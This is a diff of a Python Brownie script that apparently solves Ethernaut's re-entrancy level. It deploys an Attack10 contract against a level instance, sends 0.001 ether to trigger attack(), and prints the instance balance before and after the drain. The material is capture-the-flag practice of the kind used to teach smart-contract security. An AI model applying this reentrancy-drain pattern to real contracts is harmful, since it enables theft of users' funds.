@@ -1,35 +1,31 @@
 from scripts.helpful_scripts import get_account
 from brownie import web3, Attack10, interface
 
-ETHERNAUT_INSTANCE = "0x561Ca003B90617eeca74692FEF51BB20EcAaA19d"
+ETHERNAUT_INSTANCE = "0xA4304cA17479b9e67e3Aa61e5B7003691D0E8715"
 AMOUNT = "0.001 ether"
-GAS_LIMIT = 600000
+GAS_LIMIT = 6000000
 
 
 def main():
 
     player = get_account()
 
-    # set target (interface address)
-    target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
+    # target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
 
-    # print balance
-    eth_balance_instance = web3.fromWei(target.balance(), "ether")
-    print(f"\nBalance of ethernaut instance = {eth_balance_instance}\n")
+    # deploy attack contract        <><><><><><><><><>
+    attack = Attack10.deploy(ETHERNAUT_INSTANCE, {"from": player})
 
-    # deploy attack contract     <><><><><><><><><>
-    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
-
-    # print balance
-    eth_balance_attack = web3.fromWei(attack.balance(), "ether")
-    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")
-
-    # print balance
     balance_ETHERNAUT_INSTANCE = web3.eth.get_balance(ETHERNAUT_INSTANCE)
     balance_ETHERNAUT_INSTANCE_ether = web3.fromWei(balance_ETHERNAUT_INSTANCE, "ether")
     print(f"\nBalance of Ethernaut level = {balance_ETHERNAUT_INSTANCE_ether} ETH\n")
 
-    print(f"\nCalling attack() from {attack}\n")
+    # call attack() on Attack10     <><><><><><><><><>
+    attack.attack(
+        {"from": player, "value": AMOUNT, "allow_revert": True, "gas_limit": GAS_LIMIT}
+    )
 
-    # HERE!!!!!
-    attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
+    balance_ETHERNAUT_INSTANCE = web3.eth.get_balance(ETHERNAUT_INSTANCE)
+    balance_ETHERNAUT_INSTANCE_ether = web3.fromWei(balance_ETHERNAUT_INSTANCE, "ether")
+    print(
+        f"\nBalance of Ethernaut level post attack = {balance_ETHERNAUT_INSTANCE_ether} ETH\n"
+    )
